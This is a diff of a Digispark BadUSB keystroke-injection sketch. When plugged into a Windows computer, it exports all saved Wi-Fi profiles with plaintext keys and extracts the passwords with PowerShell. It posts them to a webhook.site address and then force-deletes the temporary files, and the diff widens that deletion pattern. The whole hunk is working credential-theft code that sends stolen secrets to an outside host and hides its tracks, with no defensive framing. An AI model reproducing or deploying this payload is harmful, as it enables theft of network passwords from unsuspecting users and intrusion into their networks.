@@ -35,11 +35,11 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell Select-String -Path Wi-Fi-* -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
+  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
   DigiKeyboard.delay(500);
   DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("del Wi-Fi-* /s /f /q"); //cleaning up all the mess
+  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
   DigiKeyboard.delay(100);
   DigiKeyboard.println("exit");
   DigiKeyboard.delay(100);
